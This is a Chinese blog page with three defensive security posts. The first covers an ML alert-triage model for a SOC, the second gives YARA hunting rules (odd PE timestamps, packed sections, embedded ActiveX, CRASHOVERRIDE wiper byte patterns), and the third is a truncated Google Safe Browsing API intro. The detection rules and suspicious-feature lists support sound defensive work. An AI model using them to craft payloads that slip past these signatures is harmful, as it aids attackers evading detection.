        <h5 id="基本监督模型过程"><a href="#基本监督模型过程" class="headerlink" title="基本监督模型过程"></a>基本监督模型过程</h5><p>​    数据科学术语是“有监督的分类模型”，它被“监督”意味着它通过已被标记为正常或恶意的数据来学习，并且它是一种被训练的“分类模型”，我们希望它检测一个新的数据能几个离散的结果之间做出决策。在我们的例子中，我们只希望它在告警的两个“类”之间做出决定：恶意和正常。<br>    为了开始创建这样的模型，必须收集数据集。该数据集构成了模型的“经验”，是我们用来“训练”模型以做出决策的信息。监督模型，每个数据单元必须标记为恶意或正常，以便模型可以评估每个观察结果，并弄清楚是什么使它恶意，什么使它正常。通常，收集干净的标记数据集是监督模型管道中最难的部分之一; 但是，就我们的SOC而言，我们的分析师每周都会不断地对数千个警报进行分类（或“标记”），因此我们很能够获得大量干净，标准化的标签警报。</p>
<p>​    一旦定义了标记数据集，下一步就是定义“功能”，可用于描绘每个告警中的信息。“特征”可以被认为是这一点信息的一个方面。例如，如果信息表示为字符串，则自然“特征”可以是字符串的长度。为我们的警报分类模型构建功能背后的核心思想是找到一种方法来表示和记录分析师在做出决策时可能考虑的所有方面。</p>
<p>然后，构建模型需要选择要使用的模型结构，并在可用总数据的子集上训练模型。训练数据集越大越多样化，模型通常表现越好。剩下的数据用作“测试集”，以查看训练的模型是否确实有效。拿出这个测试装置可以确保模型在以前从未见过的样品上进行评估，但真正的标签是已知的。</p>
<p>最后，确保有一种方法可以评估模型随时间的效果，以及调查错误以便进行适当的调整。如果没有计划和管道进行评估和重新培训，该模型几乎肯定会在性能上衰退。</p>
<h5 id="特征工程"><a href="#特征工程" class="headerlink" title="特征工程"></a>特征工程</h5><p>​    在创建我们自己的模型之前，我们采访了经验丰富的分析师，并在做出警报决策之前记录了他们通常评估的信息。这些访谈构成了我们的特征提取的基础。例如，当分析师说审查警报“很容易”时，我们会问：“为什么？什么可以帮助你做出这个决定？“正是这种逆向工程的各种方法让我们可以深入了解我们可以用来捕捉分析的特征和模型。</p>
<p>例如，考虑一个进程执行事件。有关潜在恶意进程执行的警报可能包含以下字段：</p>
<p>进程路径<br>进程MD5<br>父进程<br>进程命令参数<br>虽然这可能最初看起来像一个有限的特征空间，但是可以从这些字段中提取许多有用的信息。</p>
<p>从“C：\ windows \ temp \ m.exe”的进程路径，分析师可以立即看到一些特征：</p>
<p>该进程驻留在一个临时文件夹中：C：\ windows \ temp \<br>该进程是文件系统深处的两个目录<br>进程可执行文件名称长度为一个字符<br>该进程具有.exe扩展名<br>该过程不是“常见”进程名称<br>虽然这些看似简单，但在大量数据和示例中，提取这些信息将有助于模型区分事件。即使是最基本方面也必须被捕获，以“教导”模型以分析师的方式查看程序。</p>
<p>然后将这些特征编码为更离散的表示，类似于：</p>
<table>
<thead>
<tr>
<th>Temp_folder</th>
<th>Depth</th>
<th>Name_Length</th>
<th>Extension</th>
<th>common_process_name</th>
</tr>
</thead>
<tbody>
<tr>
<td>TRUE</td>
<td>2</td>
<td>1</td>
<td>exe</td>
<td>FALSE</td>
</tr>
</tbody>
</table>
<p>关于进程执行，需要考虑的另一个重要特性是父流程和子流程的组合。偏离预期的“血统”可能是恶意活动的强烈指标。</p>
<p>假设上述示例的父进程是’powershell.exe’。然后可以从父进程和进程本身的串联中获得潜在的新功能：’powershell.exe_m.exe’。这在功能上用作父子关系的标识，并捕获另一个关键分析工件。</p>
<p>然而，最富裕的领域可能是过程论证。流程参数是他们自己的语言，语言分析是预测分析的良好前提空间。</p>
<p>我们可以寻找包括但不限于：</p>
<p>网络连接字符串（例如’http：//‘，’https：//‘，’ftp：//‘）。<br>Base64编码命令<br>注册表键（’HKLM’，’HKCU’）<br>混淆的证据（蜱，$，分号）（阅读Daniel Bohannon的更多工作）<br>这些特征及其值在训练数据集中的显示方式将定义模型的学习方式。基于数千个警报的功能分布，特征和标签之间将开始出现关系。然后，这些关系将记录在我们的模型中，并最终用于影响新警报的预测。查看训练集中的特征分布可以深入了解这些潜在关系中的一些。</p>
<p>例如，图2显示了在按恶意（红色）和良性（蓝色）分组时如何显示“处理命令长度”的分布。</p>
<p>图2：按流程命令长度分组的流程事件警报的分布</p>
<p>此图表显示，在一部分样本中，命令长度越长，恶意的可能性就越大。这表现为右侧为红色，左侧为蓝色。但是，工艺长度不是唯一的因素。</p>
<p>作为我们的功能集的一部分，我们还认为近似每个命令的“复杂性”是有用的。为此，我们使用了“ Shannon entropy ”，这是一种常用的度量标准，用于衡量一串字符中存在的随机性程度。</p>
<p>图3显示了命令熵的分布，分为恶意和良性。虽然这些类没有完全分开，但我们可以看到，对于这个数据样本，具有较高熵的样本通常具有较高的恶意机会。</p>
<p>图3：按熵分组的流程事件警报的分布</p>
<p>模型选择与推广<br>一旦为整个数据集生成了特征，就可以使用它们来训练模型。选择最佳模型没有完美的程序，但查看数据中的特征类型可以帮助缩小范围。在流程事件的情况下，我们有一些表示为字符串和数字的功能组合。当分析师评估每个工件时，他们会询问有关每个工件的问题，并将这些问题结合起来估算流程是恶意的概率。</p>
<p>对于我们的用例，优先考虑“可解释的”模型也是有意义的 - 也就是说，可以更容易地揭示它为什么做出关于工件的特定决定的模型。通过这种方式，分析师可以建立对模型的信心，以及检测和修复模型正在制造的分析错误。鉴于数据的性质，分析师做出的决策以及对可解释性的渴望，我们认为基于决策树的模型非常适合于警报分类。</p>
<p>有许多公开可用的资源可以学习决策树，但决策树背后的基本直觉是它是一个迭代过程，要求一系列问题试图得出一个非常自信的答案。任何玩过“二十个问题”游戏的人都熟悉这个概念。最初，要求提出一般性问题以帮助消除可能性，然后要求更具体的问题来缩小可能性。在提出足够的问题并回答之后，“提问者”认为他们很有可能猜出正确的答案。</p>
<p>图4显示了可用于评估流程执行的决策树的示例。</p>
<p>图4：用于确定警报是良性还是恶意的决策树</p>
<p>对于图中的示例警报，“决策路径”标记为红色。这就是此决策树模型进行预测的方式。它首先问：“长度是否大于100个字符？”如果是这样，它会转到下一个问题“它是否包含字符串’http’？”等等，直到它有信心做出有根据的猜测。在图4的示例中，假设在此决策路径中传播的所有训练警报中有95％是恶意的，该模型预测此警报也有95％的可能性是恶意的。</p>
<p>因为他们可以询问这些详细的问题组合，所以决策树可能会“过度拟合”，或者学习与训练集过于紧密联系的规则。这降低了模型“推广”到新数据的能力。减轻这种影响的一种方法是使用许多稍微不同的决策树，并让它们各自对结果“投票”。决策树的这种“集合”称为随机森林，它可以在野外部署时提高模型的性能。这是我们最终为我们的模型选择的算法。</p>
<p>SOC警报模型如何工作<br>当出现新警报时，工件中的数据将转换为编码要素的向量，其结构与用于训练模型的要素表示相同。然后，模型评估该“特征向量”并对预测标签应用置信度。根据我们设置的阈值，我们可以将警报分类为恶意或良性。</p>
<p>图5：捕获原始值时向分析师显示的警报</p>
<p>例如，图5中显示的事件可能会创建以下功能值：</p>
<p>父进程：’wscript’<br>命令熵：5.08<br>命令长度= 103<br>根据它们的训练方式，模型中的树各自询问新特征向量的一系列问题。当特征向量遍历每个树时，它最终会收敛于终端“叶子”，将其分类为良性或恶意。然后，我们可以评估每棵树所做的聚合决策，以估计向量中哪些特征在最终分类中起最大作用。</p>
<p>对于SOC中的分析师，我们然后呈现从模型中提取的特征，显示这些特征在整个数据集上的分布。这使分析师能够深入了解模型的“原因”，以及它们如何在我们看到的所有警报中表示这些功能。例如，此警报的“说明”可能如下所示：</p>
<p>命令熵= 5.08&gt; 4.60：51.73％威胁<br>occuranceOfChar“\”= 9.00&gt; 4.50：64.09％威胁<br>occuranceOfChar：“）”（= 0.00）&lt;= 0.50：78.69％威胁<br>NOT processTree =“cmd.exe_to_cscript.exe”：99.6％威胁<br>因此，在分析时，分析人员可以看到事件的原始数据，模型的预测，决策路径的近似，以及整体特征重要性的简化，可解释的视图。</p>
<p>SOC如何使用模型<br>显示模型用于得出结论的特征允许有经验的分析师将他们的方法与模型进行比较，并在模型出错的情况下给出反馈。相反，新的分析师可能会学会查看他们可能错过的功能：父子关系，混淆的迹象或参数中的网络连接字符串。毕竟，该模型已经了解了每个分析师对数千个警报的集体体验。因此，该模型提供了对分析师总体经验的可操作反映回 SOC，以便每个分析师可以向他们的同事传递学习。</p>
<p>此外，可以使用模型的输出作为参数来编写规则。如果模型对一部分警报特别有信心，并且SOC感觉很自然地自动对该系列威胁进行分类，则可以简单地编写一条规则来说：“如果警报属于此类型，则此恶意软件系列为AND，并且模型置信度高于99，自动调用此警报并生成报告。“或者，如果存在可能的误报风暴，可以使用低于10的模型得分编写规则来剔除误报群。</p>
<p>模型如何有效<br>模型训练的那天，它停止学习。但是，威胁 - 以及警报 - 不断发展。因此，必须使用新的警报数据不断重新训练模型，以确保它继续学习环境的变化。</p>
<p>此外，随着时间的推移监控模型的整体功效至关重要。建立功效分析管道以将模型结果与分析师反馈进行比较将有助于确定模型是否开始漂移或发展结构偏差。评估和整合分析师反馈对于识别和解决特定的错误分类以及发现可能需要的潜在新功能也至关重要。</p>
<p>为了实现这些目标，我们运行后台工作，使用新标记的事件更新我们的培训数据库。随着我们收到越来越多的警报，我们会定期使用新的观察结果重新训练我们的模型。如果我们遇到准确性问题，我们会进行诊断并努力解决这些问题。一旦我们对再培训模型的整体准确度得分感到满意​​，我们就会存储模型对象并开始使用该模型版本。</p>
<p>我们还为分析师提供反馈机制，以记录模型何时出错。分析师可以查看模型提供的标签和解释，但也可以自己做出决定。无论他们是否同意模型，他们都可以通过界面输入自己的标签。我们存储由分析师提供的这个标签以及他们给出的关于解释的任何可选解释。</p>
<p>最后，应该注意的是，这些手册标签可能需要进一步评估。例如，考虑商品恶意软件警报，其中网络命令和控制通信陷入困境。分析师可以评估警报，撤回分类细节，包括PCAP样本，并查看恶意软件执行时的真实威胁减轻了对环境的影响。由于它不代表紧急威胁，分析师可能会将此警报标记为“良性”。然而，它被沉没的事实并没有改变执行工件仍然代表恶意活动。在不同的情况下，这种感染可能会对组织产生负面影响。但是，如果在重新训练模型时使用良性标签，那将告诉模型本质上恶意的东西实际上是良性的，并且可能在将来导致漏报。</p>
<p>随着时间的推移监控功效，使用新警报更新和重新培训模型，以及评估手动分析师反馈，使我们可以了解模型的表现和学习方式。最终，这有助于建立对模型的信心，因此我们可以自动执行更多任务，并释放分析师时间来执行狩猎和调查等任务。</p>
<p>结论<br>有监督的学习模型不是经验丰富的分析师的替代品。但是，将预测分析和机器学习纳入SOC工作流程有助于提高分析师的工作效率，节省时间，并确保他们利用调查技能和创造力来应对真正需要专业知识的威胁。</p>
<p>本博文概述了为SOC构建警报分类模型的主要组件和注意事项。在构建此类模型时，必须仔细考虑数据收集，标签，特征生成，模型培训和功效分析。FireEye继续重复研究，以提高我们的检测和响应能力，不断提高我们产品的检测效率，并最终保护我们的客户。</p>
<p>本文中讨论的过程和示例不仅仅是研究。在我们的FireEye Managed Defense SOC中，我们使用上述流程构建的警报分类模型来提高效率，并确保我们将分析师的专业知识应用到最需要的地方。在不断增加的威胁和警报的世界中，提高SOC效率可能意味着缺失和捕获关键入侵之间的差异。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2018/09/06/构建SOC的机器学习分析模型/" data-id="cjprzgecz001fsg9l8kndj6ev" class="article-share-link">Partager</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="w-使用YARA规则进行威胁狩猎" class="article article-type-w" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/08/14/使用YARA规则进行威胁狩猎/" class="article-date">
  <time datetime="2018-08-14T05:17:20.000Z" itemprop="datePublished">2018-08-14</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/08/14/使用YARA规则进行威胁狩猎/">使用YARA规则进行威胁狩猎</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>​     <a href="https://virustotal.github.io/yara/" target="_blank" rel="external">YARA</a> (yet another regex alternative) 是一种具有多种用途的模式匹配工具，在恶意软件分析和报警中有广泛的应用。框架本身很简单，相对容易理解(特别是基本字符串匹配方面)，而且非常灵活。然而，在应用到非常具体的恶意软件示例之后，YARA通常仅限于签名式使用。虽然这本身并不是一个“坏”的用途，但人为地限制了安全研究人员在环境中进行和捕获的内容。</p>
<p>​    在典型应用中，YARA被用作另一种基于签名的恶意软件检测方法。在由Christopher Culling撰写的SANS<a href="https://www.sans.org/reading-room/whitepapers/tools/yara-rules-rule-basic-advanced-38560" target="_blank" rel="external">论文</a>中可以找到YARA的优秀概述。 在去年年底围绕<a href="https://dragos.com/blog/trisis/" target="_blank" rel="external">TRISIS</a>/<a href="https://www.fireeye.com/blog/threat-research/2017/12/attackers-deploy-new-ics-attack-framework-triton.html" target="_blank" rel="external">TRITON</a> 恶意软件的激烈讨论是一个更具体的例子。当时，FireEye研究员尼克·卡尔（<a href="https://twitter.com/ItsReallyNick" target="_blank" rel="external">Nick Carr</a>)发布了YARA规则，并<a href="https://twitter.com/ItsReallyNick/status/941346442748289024" target="_blank" rel="external">强调</a>它在几个月内没有发现误报。 从针对特定威胁的集中检测的角度来看，这是一个非常有效的，高度针对性的规则，用于捕获在特定的攻击中观察到的非常具体的恶意软件实例。 然而，在这种检测过程中，由于规则本身受限，仅能捕获TRISIS事件中观察到的恶意软件的特定实例 ，在这种情况下，针对有一些变化的类似软件会有大量漏报。用Matthew Dunwoody和Daniel Bohannon所描述的概念来解释 ：签名是有效的，但不一定是“有弹性”。 因此，所应用的检测方法对于特定事件非常有效，但可能对变化的攻击无效。 本质上，仅为观察到的安全系统攻击框架的实现创建规则。 </p>
<p>​    另一种观点认为，YARA和现在的反病毒产品中的恶意软件检测是重复的 。 考虑到YARA在许多情况下的应用，这种立场是可以理解的，但大大低估了YARA在检测和警报方面的多功能性。 当以“传统”方式应用时，对传统防病毒来说，YARA只是代表了开源，灵活的竞争者。 虽然这是有用的，但最终的功能和限制仍然是相同。</p>
<p>​    上述两种观点对YARA的理解都是片面的。 YARA当然可以用于针对确切的恶意软件类型，家族甚至样本进行非常具体的检测，但这样做完全忽略了YARA的灵活性，可以检测文件中的可疑（如果不是彻头彻尾的恶意）功能。从狩猎的角度来看，我们作为防御者不希望追求明确知道的恶意软件，可能其他安全控制已经处理过这些恶意软件（例如商业防病毒）。 相反，威胁搜寻应该通过搜索找出进一步研究和分析的潜在攻击来寻找可能的恶意活动的迹象。 从YARA的角度来看，这意味着不会寻找确切的恶意软件签名，而是在文件中检测可能的恶意活动。 </p>
<p>为了举例说明我用YARA进行威胁狩猎，请遵循以下非常简单的规则： </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">rule odd_creation_date</div><div class="line"></div><div class="line">&#123;</div><div class="line"></div><div class="line">meta:</div><div class="line"></div><div class="line">description = <span class="string">"Identifying times either in the distant past or future for alerting."</span></div><div class="line"></div><div class="line">author = <span class="string">"Joe Slowik, Dragos Inc"</span></div><div class="line"></div><div class="line">condition:</div><div class="line"></div><div class="line">pe.timestamp &gt; time.now() or  pe.timestamp &lt; 946684800</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>以上规则是查找具有特定编译时间戳的可移植可执行文件。 就其本身而言，这是一个可疑的检测点 ，但不一定是恶意的。 但作为与上下文信息配对的检测点，这个非常简单的规则可以变得非常强大：例如，在监视环境中对“新”二进制文件的过滤器进行配对或作为搜索应用时，或从未知或者之前没有见过的网站下载二进制文件。</p>
<p>稍微复杂一点，以下是程序化混淆或打包的规则：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">rule suspicious_pe_entropy</div><div class="line"></div><div class="line">&#123;</div><div class="line"></div><div class="line">meta:</div><div class="line"></div><div class="line">description = <span class="string">"Identify PE sections with high levels of entropy indicating encoding."</span></div><div class="line"></div><div class="line">author = <span class="string">"Joe Slowik, Dragos Inc."</span></div><div class="line"></div><div class="line">condition:</div><div class="line"></div><div class="line">uint16(0) == 0x5a4d and pe.number_of_sections &gt; 2 and</div><div class="line"></div><div class="line"><span class="keyword">for</span> any i <span class="keyword">in</span> (0..pe.number_of_sections -1): (</div><div class="line"></div><div class="line">math.entropy(pe.sections[i].raw_data_offset, </div><div class="line"></div><div class="line">pe.sections[i].raw_data_size) &gt;= 7.4)</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<pre><code>在这种情况下，查看PE部分熵来识别混淆或打包的代理，规则迭代每个部分以确定是否满足阈值。一些合法的软件为了防止逆向工程或是竞争对手分析，具有这些方面，但这可作为与其他方面相结合的指标，上述内容可以作为狩猎（或监控）初始输入，以识别新的，尚未知晓的恶意活动。 
</code></pre><p>最后，通常利用文档文件格式来传递恶意payload。虽然宏很流行，但嵌入式ActiveX对象（如Flash对象或PE文件）可以类似地用于启动利用和渗透。 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">rule embedded_activex</div><div class="line"></div><div class="line">&#123;</div><div class="line"></div><div class="line">meta:</div><div class="line"></div><div class="line">Description = <span class="string">"Rule to identify embedded ActiveX objects in Documents."</span></div><div class="line"></div><div class="line">Author = <span class="string">"Joe Slowik, Dragos Inc."</span></div><div class="line"></div><div class="line">strings:</div><div class="line"></div><div class="line"><span class="variable">$header1</span> = &#123; D0 CF 11 E0 &#125;</div><div class="line"></div><div class="line"><span class="variable">$header2</span> = &#123; 50 4B 03 04 &#125;</div><div class="line"></div><div class="line"><span class="variable">$flashHeader1</span> = &#123; 46 57 53 &#125;</div><div class="line"></div><div class="line"><span class="variable">$flashHeader2</span> = &#123; 43 57 53 &#125;</div><div class="line"></div><div class="line"><span class="variable">$mzHeader</span> = &#123;4d 5a &#125;</div><div class="line"></div><div class="line"><span class="variable">$wmfExtension</span> = <span class="string">".wmf"</span> nocase ascii wide</div><div class="line"></div><div class="line"><span class="variable">$activex</span> = <span class="string">"word/activex/activex"</span> nocase wide ascii</div><div class="line"></div><div class="line"><span class="variable">$activex_reg</span> = /word\/activeX\/activeX[1-9]\.bin/ nocase wide ascii</div><div class="line"></div><div class="line"><span class="variable">$active</span> = <span class="string">"active"</span> nocase ascii wide</div><div class="line"></div><div class="line">condition:</div><div class="line"></div><div class="line">1 of (<span class="variable">$header</span>*) and (<span class="comment">#activex &gt; 0) and (1 of ($flashHeader*) or $mzHeader or $wmfExtension) and #active &lt; 170 and $activex_reg</span></div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>同样，此规则将捕获“合法”项目 - 但与其他观察结果配合并实施为狩猎（如果不是警报）技术，可用于识别躲避传统控制的恶意文档文件。 </p>
<p>上面的例子有两个互补的想法：首先，YARA可以用来寻找可疑行为的指标;第二，YARA不必局限于已知恶意活动的确切签名。 </p>
<p>结果是YARA签名在某种程度上是“模糊的”：就他们自己而言，它们可能意义不大（并且可能导致大量误报，这取决于环境 - 所以不要在隔离中使用这些项目）。 但是，与其他丰富的数据点或分析相结合，这样的YARA检测可以变得非常有效，作为新的，而不是之前观察到的恶意活动的领先指标。 </p>
<p>然而，还有第三个案例利用YARA进行狩猎，这利用了人类的弱点和懒惰。 在这种情况下，攻击者 - 甚至是高级攻击者 - 都是人类，并且易于或需要重用以前操作中的环境，开发材料和代码库。 正如我的前同事<a href="https://twitter.com/m1k4chu" target="_blank" rel="external">Micah Yates</a>, 在2017年ReCon的 <a href="https://recon.cx/2017/montreal/resources/slides/RECON-MTL-2017-evolution_of_pirpi.pdf" target="_blank" rel="external">APT3/Pirpi talk</a> 演讲中详细介绍的那样，“高级”对手在近10年的时间里使用了几乎相同的功能来应对多种恶意软件变种。 结果：寻找攻击者可以利用“常见”功能的独特实现（例如套接字创建或数据擦除）来检测未来其他安全解决方案无法检测到的变体。 例如，与CRASHOVERRIDE / INDUSTROYER中的“wiper”功能相关联的注册表操作项： </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">rule crashoverride_wiperModuleRegistry</div><div class="line"></div><div class="line">&#123;</div><div class="line"></div><div class="line">meta:</div><div class="line"></div><div class="line">description = <span class="string">"Registry Wiper functionality assoicated with CRASHOVERRIDE"</span></div><div class="line"></div><div class="line">author = <span class="string">"Joe Slowik, Dragos Inc"</span></div><div class="line"></div><div class="line">strings:</div><div class="line"></div><div class="line"><span class="variable">$s0</span> = &#123; 8d 85 a0 ?? ?? ?? 46 50 8d 85 a0 ?? ?? ?? 68 68 0d ?? ?? 50 &#125;</div><div class="line"></div><div class="line"><span class="variable">$s1</span> = &#123; 6a 02 68 78 0b ?? ?? 6a 02 50 68 b4 0d ?? ?? ff b5 98 ?? ?? ?? ff 15 04 ?? ?? ?? &#125;</div><div class="line"></div><div class="line"><span class="variable">$s2</span> = &#123; 68 00 02 00 00 8d 85 a0 ?? ?? ?? 50 56 ff b5 9c ?? ?? ?? ff 15 00 ?? ?? ?? 85 c0 &#125;</div><div class="line"></div><div class="line">condition:</div><div class="line"></div><div class="line">uint16(0) == 0x5a4d and all of them</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>三个字节码元素上的这个非常小的签名将CRASHOVERRIDE抽头模块中的非常特定的功能归零。上述签名跟踪观察到的恶意软件实例和应用程序，但也通过关注恶意软件中部署的独特功能来寻求提供更长期的功能：将Windows系统服务值重新映射为null。  YARA背后的假设很简单：此功能可能会被相同（或类似）的攻击者重用，开发特定于功能的检测将捕获重用相同底层代码库和功能的新恶意软件类型。 虽然类似签名，但此规则旨在寻找可重复使用或类似地实现相同基础功能的其他案例或样本 - 从而创建比经典的，狭窄定制的签名更广泛的检测基础。 这次检测特别有趣的是，OlympicDestroyer恶意软件利用了一种技术，表面上与CRASHOVERRIDE的擦除功能非常相似：重新映射关键的Windows系统服务注册表值，以防止成功的功能重启。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://wsygoogol.github.io/2018/08/14/使用YARA规则进行威胁狩猎/" data-id="cjprzgecr0017sg9loi5trxtm" class="article-share-link">Partager</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="w-Google-Safe-Browsing-Api介绍" class="article article-type-w" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/07/31/Google-Safe-Browsing-Api介绍/" class="article-date">
  <time datetime="2018-07-31T07:25:01.000Z" itemprop="datePublished">2018-07-31</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/07/31/Google-Safe-Browsing-Api介绍/">Google Safe Browsing Api介绍</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h3 id="Safe-Browing-API-简介"><a href="#Safe-Browing-API-简介" class="headerlink" title="Safe Browing API 简介"></a>Safe Browing API 简介</h3><p>​    Safe browsing (安全浏览)是谷歌提供的一种服务，利用谷歌持续更新的恶意网址和钓鱼网站的数据集，来检测url的安全性，帮助我们有效抵御<a href="https://safebrowsing.google.com/#policies" target="_blank" rel="external">网上诱骗、社交工程、恶意软件、垃圾软件</a>、恶意广告、侵扰性广告以及侮辱性网站或扩展程序带来的危害。 </p>
<p>​    支持谷歌浏览器和火狐浏览器。</p>
<h3 id="Safe-Browsing-API-使用"><a href="#Safe-Browsing-API-使用" class="headerlink" title="Safe Browsing API 使用"></a>Safe Browsing API 使用</h3><h5 id="Google-Safe-Browsing-Google-Developers-官网"><a href="#Google-Safe-Browsing-Google-Developers-官网" class="headerlink" title="Google Safe Browsing | Google Developers 官网"></a>Google Safe Browsing | Google Developers 官网</h5><p><a href="https://developers.google.com/safe-browsing/" target="_blank" rel="external">https://developers.google.com/safe-browsing/ </a></p>
<p>通过介绍了解到Safe Browsing APIs(V3)现在已经弃用,将于2018年10月1日被拒绝使用。 所有Safe Browsing API客户端都应该使用（v4）API。 </p>
<h5 id="Safe-Browsing-APIs-v4-官网"><a href="#Safe-Browsing-APIs-v4-官网" class="headerlink" title="Safe Browsing APIs(v4)官网"></a>Safe Browsing APIs(v4)官网</h5><p><a href="https://developers.google.com/safe-browsing/v4/" target="_blank" rel="external">https://developers.google.com/safe-browsing/v4/</a></p>
<p>要确定URL是否位于任何安全浏览列表中,浏览器客户端可以使用Lookup API(在线版本)或Update API(离线版本)。</p>
<h5 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h5><p><a href="https://accounts.google.com/signup/v2/webcreateaccount?flowName=GlifWebSignIn&amp;flowEntry=SignUp" target="_blank" rel="external">创建Google账户</a></p>
<p><a href="https://cloud.google.com/resource-manager/docs/creating-managing-projects?hl=en&amp;visit_id=1-636686269369798517-522602518&amp;rd=1" target="_blank" rel="external">创建项目工程</a></p>
<p><a href="https://cloud.google.com/docs/authentication/api-keys?hl=en&amp;ref_topic=6262490&amp;visit_id=1-636686278056026695-2572364886&amp;rd=1" target="_blank" rel="external">申请API key</a>,创建的项目是通过API key与谷歌提供的API服务相连接的一个接口。 </p>
<p><a href="https://support.google.com/cloud/answer/6158841?hl=en" target="_blank" rel="external">激活API</a>,选择相应的项目，选择API和服务，然后选择库，点击Enable</p>
<h5 id="Lookup-API-v4"><a href="#Lookup-API-v4" class="headerlink" title="Lookup API (v4)"></a>Lookup API (v4)</h5><p>​    Lookup API就是浏览器将URL发送到Google Safe Browsing服务器以检查其安全性。Lookup API比Update API简单易用。 </p>
<h6 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h6><p>简单的URL检测:您发送带有URL的HTTP POST请求，服务器以URL的状态（安全或不安全）进行响应。</p>
<h6 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h6><p>隐私:URL没有经过加密处理,服务器知道你查找到URL。</p>
<p>响应时间:每个查找请求都由服务器处理，影响效率。</p>
<h6 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h6><p>参考：<a href="https://developers.google.com/safe-browsing/v4/lookup-api" target="_blank" rel="external">https://developers.google.com/safe-browsing/v4/lookup-api</a></p>
<p>Request header</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">POST https://safebrowsing.googleapis.com/v4/threatMatches:find?key=API_KEY HTTP/1.1</div><div class="line">Content-Type: application/json</div></pre></td></tr></table></figure>
<p>Request body</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">    <span class="string">"client"</span>: &#123;</div><div class="line">      <span class="string">"clientId"</span>:      <span class="string">"yourcompanyname"</span>,</div><div class="line">      <span class="string">"clientVersion"</span>: <span class="string">"1.5.2"</span></div><div class="line">    &#125;,</div><div class="line">    <span class="string">"threatInfo"</span>: &#123;</div><div class="line">      <span class="string">"threatTypes"</span>:      [<span class="string">"MALWARE"</span>, <span class="string">"SOCIAL_ENGINEERING"</span>],</div><div class="line">      <span class="string">"platformTypes"</span>:    [<span class="string">"WINDOWS"</span>],</div><div class="line">      <span class="string">"threatEntryTypes"</span>: [<span class="string">"URL"</span>],</div><div class="line">      <span class="string">"threatEntries"</span>: [</div><div class="line">        &#123;<span class="string">"url"</span>: <span class="string">"http://www.urltocheck1.org/"</span>&#125;,</div><div class="line">        &#123;<span class="string">"url"</span>: <span class="string">"http://www.urltocheck2.org/"</span>&#125;,</div><div class="line">        &#123;<span class="string">"url"</span>: <span class="string">"http://www.urltocheck3.com/"</span>&#125;</div><div class="line">      ]</div><div class="line">    &#125;</div><div class="line">  &#125;</div></pre></td></tr></table></figure>
<p>Response header</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 200 OK</div><div class="line">Content-Type: application/json</div></pre></td></tr></table></figure>
